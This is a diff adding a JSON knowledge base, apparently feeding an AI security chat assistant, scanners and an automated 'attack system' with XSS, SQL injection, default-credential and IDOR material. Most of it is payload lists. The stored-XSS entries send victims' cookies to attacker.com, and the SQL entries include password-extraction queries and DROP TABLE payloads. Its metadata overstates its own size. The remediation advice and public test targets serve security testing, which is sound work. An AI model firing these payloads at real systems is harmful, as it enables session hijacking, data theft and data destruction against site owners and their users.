@@ -1,0 +1,917 @@
+{
+  "metadata": {
+    "version": "4.0.0",
+    "last_updated": "2024-01-15",
+    "description": "Complete Master RAG - Tổng hợp tất cả kiến thức bảo mật web",
+    "purpose": "RAG tổng hợp cho Chat Assistant, Smart Scanner, Burp Scanner, Nikto Scanner, Attack System",
+    "total_vulnerabilities": 4,
+    "total_payloads": 300,
+    "total_urls": 100,
+    "total_techniques": 200,
+    "total_commands": 50,
+    "total_test_sites": 20
+  },
+  "vulnerability_knowledge": {
+    "xss": {
+      "title": "Cross-Site Scripting (XSS)",
+      "description": "XSS là lỗ hổng cho phép attacker inject malicious scripts vào web pages được người dùng khác xem",
+      "severity": "High",
+      "cwe": "CWE-79",
+      "owasp_top10": "A03:2021 - Injection",
+      "example_urls": [
+        "https://xss-game.appspot.com/level1/frame?query=<script>alert('XSS')</script>",
+        "https://demo.testfire.net/search.jsp?query=<img src=x onerror=alert('XSS')>",
+        "https://testphp.vulnweb.com/search.php?test=<script>alert('XSS')</script>",
+        "https://httpbin.org/get?xss=<img src=x onerror=alert('XSS')>",
+        "https://portswigger.net/web-security/cross-site-scripting",
+        "https://owasp.org/www-community/attacks/xss/",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
+        "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection",
+        "https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting",
+        "https://www.acunetix.com/websitesecurity/xss/",
+        "https://www.veracode.com/security/xss",
+        "https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)"
+      ],
+      "types": {
+        "reflected_xss": {
+          "name": "Reflected XSS",
+          "description": "Script được reflect ngay lập tức từ request đến response",
+          "payloads": [
+            "<script>alert('XSS')</script>",
+            "<img src=x onerror=alert('XSS')>",
+            "<svg onload=alert('XSS')>",
+            "javascript:alert('XSS')",
+            "<iframe src=javascript:alert('XSS')>",
+            "<input onfocus=alert('XSS') autofocus>",
+            "<body onload=alert('XSS')>",
+            "<details open ontoggle=alert('XSS')>",
+            "<video><source onerror=alert('XSS')>",
+            "<audio src=x onerror=alert('XSS')>",
+            "<embed src=javascript:alert('XSS')>",
+            "<object data=javascript:alert('XSS')>",
+            "<form><button formaction=javascript:alert('XSS')>",
+            "<marquee onstart=alert('XSS')>",
+            "<textarea onfocus=alert('XSS') autofocus>",
+            "<select onfocus=alert('XSS') autofocus>",
+            "<keygen onfocus=alert('XSS') autofocus>",
+            "<frameset onload=alert('XSS')>",
+            "<table background=javascript:alert('XSS')>",
+            "<td background=javascript:alert('XSS')>"
+          ],
+          "bypass_techniques": [
+            "HTML encoding: &lt;script&gt;alert('XSS')&lt;/script&gt;",
+            "URL encoding: %3Cscript%3Ealert('XSS')%3C/script%3E",
+            "Unicode encoding: \\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
+            "Case variation: <ScRiPt>alert('XSS')</ScRiPt>",
+            "String concatenation: <script>alert('X'+'S'+'S')</script>",
+            "String.fromCharCode: <script>alert(String.fromCharCode(88,83,83))</script>",
+            "Array join: <script>alert(['X','S','S'].join(''))</script>",
+            "Mixed quotes: <script>alert(\"XSS\")</script>",
+            "No quotes: <script>alert(XSS)</script>",
+            "Backticks: <script>alert(`XSS`)</script>",
+            "Hex encoding: <script>alert('\\x58\\x53\\x53')</script>",
+            "Octal encoding: <script>alert('\\130\\123\\123')</script>",
+            "Base64 encoding: <script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
+            "Template literals: <script>alert(`${'XSS'}`)</script>",
+            "Function constructor: <script>new Function('alert(\\'XSS\\')')()</script>"
+          ],
+          "impact": "Steal cookies, session hijacking, deface website, redirect users",
+          "severity": "High"
+        },
+        "stored_xss": {
+          "name": "Stored XSS",
+          "description": "Script được lưu trữ trên server và execute mỗi khi page được load",
+          "payloads": [
+            "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
+            "<img src=x onerror=alert('Stored XSS')>",
+            "<svg onload=fetch('/admin/delete-user?id=1')>",
+            "<iframe src=javascript:alert('Stored XSS')>",
+            "<script>fetch('http://attacker.com/steal.php?cookie='+document.cookie)</script>",
+            "<script>new Image().src='http://attacker.com/steal.php?cookie='+document.cookie</script>",
+            "<script>XMLHttpRequest().open('GET','http://attacker.com/steal.php?cookie='+document.cookie)</script>",
+            "<script>fetch('http://attacker.com/steal.php',{method:'POST',body:'cookie='+document.cookie})</script>",
+            "<script>var xhr=new XMLHttpRequest();xhr.open('POST','http://attacker.com/steal.php');xhr.send('cookie='+document.cookie)</script>",
+            "<script>navigator.sendBeacon('http://attacker.com/steal.php','cookie='+document.cookie)</script>"
+          ],
+          "impact": "Persistent attack, affects all users, data theft, account takeover",
+          "severity": "Critical"
+        },
+        "dom_xss": {
+          "name": "DOM-based XSS",
+          "description": "Vulnerability trong client-side code, script execute trong DOM",
+          "payloads": [
+            "#<img src=x onerror=alert('DOM XSS')>",
+            "#<script>alert('DOM XSS')</script>",
+            "#<svg onload=alert('DOM XSS')>",
+            "#javascript:alert('DOM XSS')",
+            "#<iframe src=javascript:alert('DOM XSS')>",
+            "#<input onfocus=alert('DOM XSS') autofocus>",
+            "#<body onload=alert('DOM XSS')>",
+            "#<details open ontoggle=alert('DOM XSS')>",
+            "?test=<img src=x onerror=alert('DOM XSS')>",
+            "?search=<script>alert('DOM XSS')</script>"
+          ],
+          "impact": "Client-side attack, bypass server-side filters, session hijacking",
+          "severity": "Medium"
+        }
+      },
+      "detection_patterns": [
+        "Response contains unescaped user input",
+        "Script tags in response body",
+        "Event handlers like onerror, onclick, onload",
+        "JavaScript URLs like javascript:alert('XSS')",
+        "HTML entities not properly encoded",
+        "CSS expressions in style attributes",
+        "Data attributes with JavaScript",
+        "Form actions with JavaScript URLs",
+        "Image sources with JavaScript URLs",
+        "Link hrefs with JavaScript URLs"
+      ],
+      "testing_methods": [
+        "Input validation testing",
+        "Output encoding verification",
+        "Content Security Policy testing",
+        "Browser security testing",
+        "DOM manipulation testing",
+        "Event handler testing",
+        "JavaScript execution testing",
+        "Filter bypass testing"
+      ],
+      "remediation": [
+        "Input validation and sanitization",
+        "Output encoding (HTML, JavaScript, CSS, URL)",
+        "Content Security Policy (CSP)",
+        "HTTP-only cookies",
+        "X-XSS-Protection header",
+        "DOM sanitization",
+        "Context-aware encoding",
+        "Regular security testing"
+      ]
+    },
+    "sql_injection": {
+      "title": "SQL Injection",
+      "description": "SQL Injection là lỗ hổng cho phép attacker inject malicious SQL code vào database queries",
+      "severity": "Critical",
+      "cwe": "CWE-89",
+      "owasp_top10": "A03:2021 - Injection",
+      "example_urls": [
+        "https://demo.testfire.net/login.jsp?username=admin' UNION SELECT 1,2,3--",
+        "https://testphp.vulnweb.com/listproducts.php?cat=1' UNION SELECT 1,2,3--",
+        "https://sqlzoo.net/hack/",
+        "https://portswigger.net/web-security/sql-injection",
+        "https://owasp.org/www-community/attacks/SQL_Injection",
+        "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
+        "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection",
+        "https://book.hacktricks.xyz/pentesting-web/sql-injection",
+        "https://www.acunetix.com/websitesecurity/sql-injection/",
+        "https://www.veracode.com/security/sql-injection",
+        "https://owasp.org/www-project-top-ten/2017/A1_2017-Injection"
+      ],
+      "types": {
+        "union_based": {
+          "name": "Union-based SQL Injection",
+          "description": "Sử dụng UNION operator để extract data từ database",
+          "payloads": [
+            "' UNION SELECT 1,2,3--",
+            "' UNION SELECT username,password FROM users--",
+            "' UNION SELECT table_name,column_name FROM information_schema.columns--",
+            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
+            "' UNION SELECT NULL,NULL,NULL--",
+            "' UNION SELECT user(),database(),version()--",
+            "' UNION SELECT @@version,@@datadir,@@hostname--",
+            "' UNION SELECT current_user(),current_database(),current_timestamp()--",
+            "' UNION SELECT schema_name FROM information_schema.schemata--",
+            "' UNION SELECT table_name FROM information_schema.tables--",
+            "' UNION SELECT column_name FROM information_schema.columns--",
+            "' UNION SELECT table_name,column_name FROM information_schema.columns--",
+            "' UNION SELECT table_schema,table_name FROM information_schema.tables--",
+            "' UNION SELECT table_schema,table_name,column_name FROM information_schema.columns--",
+            "' UNION SELECT table_schema,table_name,column_name,data_type FROM information_schema.columns--",
+            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--",
+            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--"
+          ],
+          "impact": "Data extraction, database schema disclosure, authentication bypass",
+          "severity": "Critical"
+        },
+        "boolean_based": {
+          "name": "Boolean-based Blind SQL Injection",
+          "description": "Sử dụng boolean conditions để extract data mà không cần error messages",
+          "payloads": [
+            "' AND 1=1--",
+            "' AND 1=2--",
+            "' AND (SELECT COUNT(*) FROM users) > 0--",
+            "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin') = 'a'--",
+            "' AND (SELECT LENGTH(password) FROM users WHERE username='admin') > 5--",
+            "' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 65--",
+            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
+            "' AND (SELECT COUNT(*) FROM information_schema.columns) > 0--",
+            "' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND LENGTH(password)>5) > 0--",
+            "' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))>65) > 0--"
+          ],
+          "impact": "Data extraction through boolean conditions, authentication bypass",
+          "severity": "High"
+        },
+        "time_based": {
+          "name": "Time-based Blind SQL Injection",
+          "description": "Sử dụng time delays để extract data",
+          "payloads": [
+            "'; WAITFOR DELAY '00:00:05'--",
+            "'; SELECT SLEEP(5)--",
+            "'; pg_sleep(5)--",
+            "'; (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a' AND SLEEP(5))--",
+            "'; (SELECT COUNT(*) FROM information_schema.tables WHERE SLEEP(5))--",
+            "'; (SELECT COUNT(*) FROM information_schema.columns WHERE SLEEP(5))--",
+            "'; (SELECT COUNT(*) FROM users WHERE username='admin' AND LENGTH(password)>5 AND SLEEP(5))--",
+            "'; (SELECT COUNT(*) FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))>65 AND SLEEP(5))--"
+          ],
+          "impact": "Data extraction through time delays, authentication bypass",
+          "severity": "High"
+        }
+      },
+      "database_specific": {
+        "mysql": {
+          "error_patterns": [
+            "You have an error in your SQL syntax",
+            "Warning: mysql_connect()",
+            "MySQL server has gone away",
+            "Access denied for user"
+          ],
+          "payloads": [
+            "' OR 1=1--",
+            "' UNION SELECT 1,2,3--",
+            "'; DROP TABLE users--",
+            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--"
+          ]
+        },
+        "postgresql": {
+          "error_patterns": [
+            "PostgreSQL query failed",
+            "FATAL: password authentication failed",
+            "ERROR: syntax error at or near",
+            "relation does not exist"
+          ],
+          "payloads": [
+            "' OR 1=1--",
+            "' UNION SELECT 1,2,3--",
+            "'; DROP TABLE users--",
+            "' AND (SELECT COUNT(*) FROM pg_tables) > 0--"
+          ]
+        },
+        "mssql": {
+          "error_patterns": [
+            "Microsoft OLE DB Provider for SQL Server",
+            "SQL Server does not exist or access denied",
+            "Incorrect syntax near",
+            "Login failed for user"
+          ],
+          "payloads": [
+            "' OR 1=1--",
+            "' UNION SELECT 1,2,3--",
+            "'; DROP TABLE users--",
+            "' AND (SELECT COUNT(*) FROM sysobjects) > 0--"
+          ]
+        }
+      },
+      "detection_patterns": [
+        "SQL error messages in response",
+        "Database schema information disclosure",
+        "UNION operator in queries",
+        "Column count enumeration",
+        "Time delays in responses",
+        "Boolean condition differences",
+        "Database version information",
+        "Table and column enumeration"
+      ],
+      "testing_methods": [
+        "Input validation testing",
+        "Error message analysis",
+        "Time-based testing",
+        "Boolean-based testing",
+        "Union-based testing",
+        "Database fingerprinting",
+        "Schema enumeration",
+        "Data extraction testing"
+      ],
+      "remediation": [
+        "Prepared statements",
+        "Parameterized queries",
+        "Input validation",
+        "Least privilege principle",
+        "Database security hardening",
+        "Regular security testing",
+        "Error message sanitization",
+        "Database monitoring"
+      ]
+    },
+    "misconfiguration": {
+      "title": "Security Misconfiguration",
+      "description": "Security misconfiguration là lỗ hổng do cấu hình bảo mật không đúng",
+      "severity": "Medium",
+      "cwe": "CWE-1188",
+      "owasp_top10": "A05:2021 - Security Misconfiguration",
+      "example_urls": [
+        "https://demo.testfire.net/login.jsp (admin/admin)",
+        "https://httpbin.org/basic-auth/user/pass",
+        "https://demo.testfire.net/images/",
+        "https://httpbin.org/",
+        "https://securityheaders.com/",
+        "https://www.owasp.org/index.php/Testing_for_Default_Credentials",
+        "https://www.owasp.org/index.php/Testing_Directory_traversal",
+        "https://www.owasp.org/index.php/OWASP_Secure_Headers_Project",
+        "https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html",
+        "https://www.owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration"
+      ],
+      "types": {
+        "default_credentials": {
+          "name": "Default Credentials",
+          "description": "Sử dụng default username/password không được thay đổi",
+          "payloads": [
+            "admin:admin",
+            "admin:password",
+            "admin:123456",
+            "root:root",
+            "administrator:administrator",
+            "guest:guest",
+            "test:test",
+            "demo:demo",
+            "user:user",
+            "admin:",
+            ":admin",
+            "admin:admin123",
+            "root:password",
+            "admin:root",
+            "administrator:admin",
+            "admin:pass",
+            "admin:1234",
+            "admin:12345",
+            "admin:123456789",
+            "admin:qwerty"
+          ],
+          "impact": "Full system compromise, data breach, unauthorized access",
+          "severity": "Critical"
+        },
+        "directory_listing": {
+          "name": "Directory Listing",
+          "description": "Web server hiển thị directory contents thay vì index file",
+          "payloads": [
+            "/images/",
+            "/files/",
+            "/uploads/",
+            "/backup/",
+            "/admin/",
+            "/config/",
+            "/logs/",
+            "/temp/",
+            "/tmp/",
+            "/var/",
+            "/etc/",
+            "/home/",
+            "/public/",
+            "/assets/",
+            "/static/",
+            "/documents/",
+            "/downloads/",
+            "/media/",
+            "/resources/",
+            "/data/"
+          ],
+          "impact": "Information disclosure, sensitive file access, system enumeration",
+          "severity": "Medium"
+        },
+        "missing_security_headers": {
+          "name": "Missing Security Headers",
+          "description": "Thiếu các security headers quan trọng",
+          "payloads": [
+            "X-Frame-Options: DENY",
+            "X-XSS-Protection: 1; mode=block",
+            "Content-Security-Policy: default-src 'self'",
+            "Strict-Transport-Security: max-age=31536000",
+            "X-Content-Type-Options: nosniff",
+            "Referrer-Policy: strict-origin-when-cross-origin",
+            "X-Permitted-Cross-Domain-Policies: none",
+            "Cross-Origin-Embedder-Policy: require-corp",
+            "Cross-Origin-Opener-Policy: same-origin",
+            "Cross-Origin-Resource-Policy: same-origin",
+            "Permissions-Policy: geolocation=(), microphone=(), camera=()",
+            "X-Download-Options: noopen",
+            "X-DNS-Prefetch-Control: off"
+          ],
+          "impact": "Clickjacking, XSS, MITM attacks, content type confusion",
+          "severity": "Medium"
+        },
+        "debug_mode": {
+          "name": "Debug Mode Enabled",
+          "description": "Debug mode được bật trong production environment",
+          "payloads": [
+            "DEBUG = True",
+            "Stack trace information",
+            "Database query details",
+            "File path disclosure",
+            "Version information",
+            "Error details",
+            "Configuration details",
+            "Environment variables",
+            "Source code disclosure",
+            "Internal IP addresses"
+          ],
+          "impact": "Information disclosure, system enumeration, attack vector discovery",
+          "severity": "Medium"
+        }
+      },
+      "detection_patterns": [
+        "Default login pages",
+        "Common username/password combinations",
+        "Administrative interfaces",
+        "Database management interfaces",
+        "Index of / messages",
+        "Directory contents listing",
+        "File and folder enumeration",
+        "Sensitive file exposure",
+        "Missing X-Frame-Options header",
+        "Missing X-XSS-Protection header",
+        "Missing Content-Security-Policy header",
+        "Missing Strict-Transport-Security header",
+        "Detailed error messages",
+        "Stack traces in responses",
+        "Debug information disclosure",
+        "Development tools accessible"
+      ],
+      "testing_methods": [
+        "Configuration review",
+        "Security header analysis",
+        "Default credential testing",
+        "Directory enumeration",
+        "Error message analysis",
+        "Port scanning",
+        "Service enumeration",
+        "Version detection"
+      ],
+      "remediation": [
+        "Security configuration review",
+        "Default credential removal",
+        "Security header implementation",
+        "Directory listing disable",
+        "Debug mode disable in production",
+        "Regular security audits",
+        "Configuration hardening",
+        "Security monitoring"
+      ]
+    },
+    "idor": {
+      "title": "Insecure Direct Object Reference (IDOR)",
+      "description": "IDOR là lỗ hổng cho phép attacker truy cập trực tiếp vào objects mà không có authorization",
+      "severity": "High",
+      "cwe": "CWE-639",
+      "owasp_top10": "A01:2021 - Broken Access Control",
+      "example_urls": [
+        "https://demo.testfire.net/user/profile?id=1",
+        "https://demo.testfire.net/user/profile?id=2",
+        "https://demo.testfire.net/user/profile?id=3",
+        "https://demo.testfire.net/document/550e8400-e29b-41d4-a716-446655440000",
+        "https://demo.testfire.net/file/a1b2c3d4-e5f6-7890-abcd-ef1234567890",
+        "https://www.owasp.org/index.php/Testing_for_Insecure_Direct_Object_References",
+        "https://portswigger.net/web-security/access-control/idor",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html",
+        "https://www.veracode.com/security/idor",
+        "https://www.owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control"
+      ],
+      "types": {
+        "sequential_ids": {
+          "name": "Sequential ID References",
+          "description": "Sử dụng sequential IDs có thể đoán được",
+          "payloads": [
+            "/user/profile?id=1",
+            "/user/profile?id=2",
+            "/user/profile?id=3",
+            "/user/profile?id=999",
+            "/admin/user?id=1",
+            "/api/user/1",
+            "/api/user/2",
+            "/api/user/3",
+            "/api/user/999",
+            "/document/1",
+            "/document/2",
+            "/document/3",
+            "/file/1",
+            "/file/2",
+            "/file/3",
+            "/order/1",
+            "/order/2",
+            "/order/3",
+            "/invoice/1",
+            "/invoice/2"
+          ],
+          "impact": "Unauthorized data access, privacy violation, data breach",
+          "severity": "High"
+        },
+        "uuid_references": {
+          "name": "UUID References",
+          "description": "Sử dụng UUIDs nhưng vẫn có thể truy cập được",
+          "payloads": [
+            "/document/550e8400-e29b-41d4-a716-446655440000",
+            "/file/a1b2c3d4-e5f6-7890-abcd-ef1234567890",
+            "/api/document/550e8400-e29b-41d4-a716-446655440000",
+            "/api/file/a1b2c3d4-e5f6-7890-abcd-ef1234567890",
+            "/user/550e8400-e29b-41d4-a716-446655440000",
+            "/profile/a1b2c3d4-e5f6-7890-abcd-ef1234567890",
+            "/order/550e8400-e29b-41d4-a716-446655440000",
+            "/invoice/a1b2c3d4-e5f6-7890-abcd-ef1234567890"
+          ],
+          "impact": "Unauthorized data access, privacy violation, data breach",
+          "severity": "High"
+        },
+        "hash_references": {
+          "name": "Hash References",
+          "description": "Sử dụng hashes nhưng vẫn có thể truy cập được",
+          "payloads": [
+            "/resource/a1b2c3d4e5f6",
+            "/file/1234567890abcdef",
+            "/api/resource/a1b2c3d4e5f6",
+            "/api/file/1234567890abcdef",
+            "/document/a1b2c3d4e5f6",
+            "/user/1234567890abcdef",
+            "/order/a1b2c3d4e5f6",
+            "/invoice/1234567890abcdef"
+          ],
+          "impact": "Unauthorized data access, privacy violation, data breach",
+          "severity": "High"
+        }
+      },
+      "detection_patterns": [
+        "Sequential numeric IDs",
+        "Predictable object references",
+        "Direct object access",
+        "Authorization bypass",
+        "UUID pattern in URLs",
+        "Direct object access with UUIDs",
+        "Object enumeration",
+        "Hash pattern in URLs",
+        "Direct object access with hashes",
+        "User context not verified",
+        "Object ownership not checked"
+      ],
+      "testing_methods": [
+        "Object reference enumeration",
+        "Authorization testing",
+        "Access control verification",
+        "Parameter manipulation",
+        "User context testing",
+        "Object ownership testing",
+        "Privilege escalation testing",
+        "Cross-user access testing"
+      ],
+      "remediation": [
+        "Access control implementation",
+        "Object reference validation",
+        "User context verification",
+        "Indirect object references",
+        "Authorization checks",
+        "Object ownership verification",
+        "Regular access control testing",
+        "Security monitoring"
+      ]
+    }
+  },
+  "chat_assistant_commands": {
+    "slash_commands": {
+      "/help": {
+        "description": "Hiển thị hướng dẫn sử dụng",
+        "usage": "/help",
+        "example": "/help"
+      },
+      "/payload": {
+        "description": "Tạo payload cho loại lỗ hổng",
+        "usage": "/payload <type> <url>",
+        "examples": [
+          "/payload xss http://testphp.vulnweb.com",
+          "/payload sql_injection http://demo.testfire.net",
+          "/payload misconfig http://httpbin.org",
+          "/payload idor http://example.com"
+        ]
+      },
+      "/scan": {
+        "description": "Quét và phân tích lỗ hổng",
+        "usage": "/scan <url>",
+        "examples": [
+          "/scan http://testphp.vulnweb.com",
+          "/scan http://demo.testfire.net",
+          "/scan http://httpbin.org"
+        ]
+      },
+      "/": {
+        "description": "Lời chào và hướng dẫn cơ bản",
+        "usage": "/",
+        "example": "/"
+      }
+    },
+    "natural_language_examples": {
+      "greetings": [
+        "Hi",
+        "Hello",
+        "Xin chào",
+        "Chào bạn",
+        "Hey"
+      ],
+      "payload_requests": [
+        "Tạo payload XSS cho http://testphp.vulnweb.com",
+        "Hãy cho tôi payload SQL injection",
+        "Payload để test lỗ hổng misconfig",
+        "Tạo payload IDOR",
+        "Payload cho XSS reflected"
+      ],
+      "scan_requests": [
+        "Hãy scan lỗ hổng của web http://testphp.vulnweb.com",
+        "Quét bảo mật http://demo.testfire.net",
+        "Kiểm tra lỗ hổng http://httpbin.org",
+        "Test security http://example.com"
+      ],
+      "general_questions": [
+        "Hướng dẫn sử dụng",
+        "Làm gì được",
+        "Có thể giúp gì",
+        "Tính năng nào có"
+      ]
+    }
+  },
+  "scanner_configurations": {
+    "burp_scanner": {
+      "description": "Burp Scanner với LLM analysis",
+      "features": [
+        "Vulnerability scanning",
+        "LLM analysis of findings",
+        "Request/response analysis",
+        "Security assessment",
+        "Detailed reporting"
+      ],
+      "test_urls": [
+        "http://testphp.vulnweb.com",
+        "http://demo.testfire.net",
+        "http://httpbin.org"
+      ]
+    },
+    "nikto_scanner": {
+      "description": "Nikto Scanner với LLM analysis",
+      "features": [
+        "Web server vulnerability scanning",
+        "LLM analysis of results",
+        "Security header analysis",
+        "Directory enumeration",
+        "Vulnerability detection"
+      ],
+      "test_urls": [
+        "http://testphp.vulnweb.com",
+        "http://demo.testfire.net",
+        "http://httpbin.org"
+      ]
+    },
+    "smart_scanner": {
+      "description": "Smart Scanner với LLM-generated URLs",
+      "features": [
+        "LLM-generated suspicious URLs",
+        "Comprehensive scanning",
+        "LLM analysis of headers and body",
+        "Vulnerability detection",
+        "Security assessment"
+      ],
+      "test_urls": [
+        "http://testphp.vulnweb.com",
+        "http://demo.testfire.net",
+        "http://httpbin.org"
+      ]
+    }
+  },
+  "attack_system": {
+    "description": "LLM-powered attack execution and analysis",
+    "features": [
+      "Automatic payload generation",
+      "Attack execution",
+      "Result analysis",
+      "Additional URL suggestions",
+      "LLM analysis of attack results"
+    ],
+    "vulnerability_types": [
+      "XSS",
+      "SQL Injection",
+      "Misconfiguration",
+      "IDOR"
+    ]
+  },
+  "testing_methodologies": {
+    "xss_testing": [
+      "Input validation testing",
+      "Output encoding verification",
+      "Content Security Policy testing",
+      "Browser security testing",
+      "DOM manipulation testing",
+      "Event handler testing",
+      "JavaScript execution testing",
+      "Filter bypass testing"
+    ],
+    "sql_injection_testing": [
+      "Input validation testing",
+      "Error message analysis",
+      "Time-based testing",
+      "Boolean-based testing",
+      "Union-based testing",
+      "Database fingerprinting",
+      "Schema enumeration",
+      "Data extraction testing"
+    ],
+    "misconfiguration_testing": [
+      "Configuration review",
+      "Security header analysis",
+      "Default credential testing",
+      "Directory enumeration",
+      "Error message analysis",
+      "Port scanning",
+      "Service enumeration",
+      "Version detection"
+    ],
+    "idor_testing": [
+      "Object reference enumeration",
+      "Authorization testing",
+      "Access control verification",
+      "Parameter manipulation",
+      "User context testing",
+      "Object ownership testing",
+      "Privilege escalation testing",
+      "Cross-user access testing"
+    ]
+  },
+  "tools_and_resources": {
+    "xss_tools": [
+      "Burp Suite",
+      "OWASP ZAP",
+      "XSSer",
+      "BeEF",
+      "XSStrike",
+      "XSS Hunter",
+      "XSS Validator",
+      "XSS Scanner"
+    ],
+    "sql_injection_tools": [
+      "SQLMap",
+      "Burp Suite",
+      "OWASP ZAP",
+      "Havij",
+      "NoSQLMap",
+      "jSQL Injection",
+      "SQLNinja",
+      "BBQSQL"
+    ],
+    "misconfiguration_tools": [
+      "Nmap",
+      "Nikto",
+      "Dirb",
+      "Gobuster",
+      "Security Headers",
+      "SSL Labs",
+      "Mozilla Observatory",
+      "Security Headers Scanner"
+    ],
+    "idor_tools": [
+      "Burp Suite",
+      "OWASP ZAP",
+      "Custom scripts",
+      "Manual testing",
+      "Authorization testing tools",
+      "Access control testing tools"
+    ]
+  },
+  "common_test_sites": {
+    "xss_test_sites": [
+      "https://xss-game.appspot.com/",
+      "https://demo.testfire.net/",
+      "https://testphp.vulnweb.com/",
+      "https://httpbin.org/",
+      "https://portswigger.net/web-security/cross-site-scripting"
+    ],
+    "sql_injection_test_sites": [
+      "https://demo.testfire.net/",
+      "https://testphp.vulnweb.com/",
+      "https://sqlzoo.net/hack/",
+      "https://portswigger.net/web-security/sql-injection"
+    ],
+    "misconfiguration_test_sites": [
+      "https://demo.testfire.net/",
+      "https://httpbin.org/",
+      "https://securityheaders.com/",
+      "https://www.owasp.org/index.php/Testing_for_Default_Credentials"
+    ],
+    "idor_test_sites": [
+      "https://demo.testfire.net/",
+      "https://portswigger.net/web-security/access-control/idor"
+    ]
+  },
+  "llm_analysis_guidelines": {
+    "xss_analysis": {
+      "key_indicators": [
+        "Unescaped user input in response",
+        "Script tags or event handlers in output",
+        "JavaScript execution in browser",
+        "Cookie or session data exposure"
+      ],
+      "severity_assessment": {
+        "critical": "Stored XSS affecting all users",
+        "high": "Reflected XSS with session hijacking potential",
+        "medium": "DOM-based XSS with limited impact"
+      },
+      "recommendations": [
+        "Implement input validation and sanitization",
+        "Use output encoding for all user-controlled data",
+        "Implement Content Security Policy (CSP)",
+        "Set HTTP-only cookies",
+        "Use X-XSS-Protection header"
+      ]
+    },
+    "sql_injection_analysis": {
+      "key_indicators": [
+        "SQL error messages in response",
+        "Database schema information disclosure",
+        "Time delays in responses",
+        "Boolean condition differences"
+      ],
+      "severity_assessment": {
+        "critical": "Union-based injection with data extraction",
+        "high": "Boolean or time-based blind injection",
+        "medium": "Error-based injection with limited impact"
+      },
+      "recommendations": [
+        "Use prepared statements or parameterized queries",
+        "Implement input validation",
+        "Apply least privilege principle",
+        "Enable database security features",
+        "Regular security testing"
+      ]
+    },
+    "misconfiguration_analysis": {
+      "key_indicators": [
+        "Default credentials working",
+        "Directory listing enabled",
+        "Missing security headers",
+        "Debug information disclosure"
+      ],
+      "severity_assessment": {
+        "critical": "Default credentials with admin access",
+        "high": "Directory listing with sensitive files",
+        "medium": "Missing security headers"
+      },
+      "recommendations": [
+        "Change all default credentials",
+        "Disable directory listing",
+        "Implement security headers",
+        "Disable debug mode in production",
+        "Regular configuration review"
+      ]
+    },
+    "idor_analysis": {
+      "key_indicators": [
+        "Sequential or predictable object IDs",
+        "Direct object access without authorization",
+        "User context not verified",
+        "Object enumeration possible"
+      ],
+      "severity_assessment": {
+        "high": "Direct access to other users' data",
+        "medium": "Limited unauthorized access",
+        "low": "Information disclosure only"
+      },
+      "recommendations": [
+        "Implement proper access controls",
+        "Use indirect object references",
+        "Verify user context for all requests",
+        "Implement authorization checks",
+        "Use unpredictable object identifiers"
+      ]
+    }
+  },
+  "rag_optimization": {
+    "false_positive_reduction": {
+      "confidence_thresholds": {
+        "high": 0.8,
+        "medium": 0.6,
+        "low": 0.4
+      },
+      "validation_methods": [
+        "Pattern-based validation",
+        "LLM-based validation",
+        "Context-aware validation",
+        "Multi-source verification"
+      ]
+    },
+    "accuracy_improvement": {
+      "techniques": [
+        "URL reference validation",
+        "Payload verification",
+        "Technique confirmation",
+        "Multi-layer analysis"
+      ],
+      "metrics": [
+        "Precision improvement",
+        "Recall enhancement",
+        "False positive reduction",
+        "Context accuracy"
+      ]
+    }
+  }
+}
